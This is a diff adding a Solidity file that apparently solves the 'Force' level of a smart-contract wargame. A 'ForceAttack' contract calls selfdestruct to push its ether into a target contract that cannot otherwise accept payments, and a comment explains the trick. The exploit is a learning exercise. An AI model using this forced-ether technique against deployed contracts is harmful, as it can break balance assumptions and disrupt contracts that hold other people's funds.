@@ -1,0 +1,28 @@
+pragma solidity ^0.6.0;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+
+
+contract ForceAttack {
+
+constructor() public payable {
+
+}
+
+function attack(address _contractAddr) public {
+  selfdestruct(_contractAddr);
+  
+}
+
+// selfdestruct will force the contract holding ether to send it before the contract self-implodes
+
+
+}
